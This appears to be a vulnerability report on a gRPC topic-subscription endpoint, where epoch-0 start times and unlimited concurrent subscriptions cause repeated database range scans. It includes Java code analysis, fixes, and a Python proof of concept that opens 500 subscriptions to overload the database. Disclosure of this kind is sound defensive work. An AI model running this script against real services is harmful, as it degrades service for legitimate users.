### Title
Unbounded Concurrent Subscriptions with Epoch-0 startTime Enable Database DoS via Repeated Range Scans

### Summary
`PollingTopicListener.listen()` accepts any `startTime >= 0` (including epoch 0) with no limit and no cap on concurrent subscriptions per client. When no messages have been returned yet (`last == null`), every poll invocation re-issues a range scan from the original `startTime`, meaning a subscription anchored at epoch 0 repeatedly scans from the very beginning of topic history. An unprivileged attacker opening many such subscriptions multiplies this load, degrading database performance for all users.

### Finding Description

**Code path:**

In `PollingTopicListener.java`, `poll()` at lines 51–61:

```java
private Flux<TopicMessage> poll(PollingContext context) {
    TopicMessageFilter filter = context.getFilter();
    TopicMessage last = context.getLast();
    int limit = filter.hasLimit()
            ? (int) (filter.getLimit() - context.getCount().get())
            : Integer.MAX_VALUE;
    int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
    long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
    var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
    return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
}
``` [1](#0-0) 

**Root cause — failed assumption:** The code assumes `last` will quickly become non-null (i.e., messages will be returned), advancing the scan window forward. When the topic has no messages yet, or when the attacker targets a low-traffic topic, `last` remains `null` indefinitely, and every poll re-uses `filter.getStartTime()` — which can be epoch 0.

**Validation is insufficient:** `TopicMessageFilter.isValidStartTime()` only checks `startTime <= DomainUtils.now()`. [2](#0-1) 

Epoch 0 satisfies this check. The `@Min(0)` annotation on `startTime` explicitly permits 0. [3](#0-2) 

**Per-poll query:** `TopicMessageRepositoryCustomImpl.findByFilter()` executes a JPA criteria query `WHERE topic_id = X AND consensus_timestamp >= 0 ORDER BY consensus_timestamp LIMIT 5000` on every tick. [4](#0-3) 

**Polling loop:** The `listen()` method repeats this indefinitely with `RepeatSpec.times(Long.MAX_VALUE)` at the configured `interval` (default 500 ms). [5](#0-4) 

**No subscription limit:** There is no per-client or global cap on concurrent subscriptions. An attacker opens N subscriptions; each fires independently every 500 ms.

### Impact Explanation

Each subscription with `startTime=0` on a topic with no recent messages issues `2 queries/second` (one range scan + one native hint query) anchored at epoch 0. With N concurrent subscriptions: `2N queries/second`, all performing index range scans from the beginning of topic history. On a large table this saturates I/O and connection pool resources, causing query latency to spike for all legitimate users. The `maxPageSize` cap (default 5000, minimum 32) bounds per-query row count but does not bound aggregate query rate across subscriptions. [6](#0-5) 

### Likelihood Explanation

The gRPC `subscribeToTopic` endpoint is publicly accessible with no authentication. The attacker needs only a gRPC client and knowledge of any valid `topicId`. The attack is trivially scriptable: open hundreds of streaming RPCs with `consensusStartTime = 0` and `limit = 0`. It is repeatable and persistent as long as the connections are held open.

### Recommendation

1. **Enforce a minimum startTime lookback window**: Reject `startTime` values older than a configurable maximum (e.g., 7 days before `now()`), or clamp `startTime` to `max(filter.getStartTime(), now() - maxLookback)` before the first poll.
2. **Rate-limit / cap concurrent subscriptions per client IP or credential**: Reject new subscriptions beyond a per-client threshold.
3. **Global subscription count limit**: Track active `PollingContext` instances and reject new subscriptions when a global ceiling is reached.
4. **Advance `startTime` even on empty results**: When `last == null` and the poll returns empty, advance `startTime` to `now()` so subsequent polls do not re-scan from epoch 0.

### Proof of Concept

```python
import grpc
from concurrent.futures import ThreadPoolExecutor
# proto-generated stubs for ConsensusService
from proto import consensus_service_pb2, consensus_service_pb2_grpc
from google.protobuf.timestamp_pb2 import Timestamp

def open_subscription(stub, topic_id):
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=topic_id,
        consensusStartTime=Timestamp(seconds=0, nanos=0),  # epoch 0
        # limit omitted → 0 → no limit
    )
    for _ in stub.subscribeTopic(req):
        pass  # consume silently

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
topic = {"shardNum": 0, "realmNum": 0, "topicNum": 1}

# Open 500 concurrent subscriptions anchored at epoch 0
with ThreadPoolExecutor(max_workers=500) as pool:
    for _ in range(500):
        pool.submit(open_subscription, stub, topic)
# Result: ~1000 DB range-scan queries/second from timestamp=0,
# degrading response times for all legitimate subscribers.
```
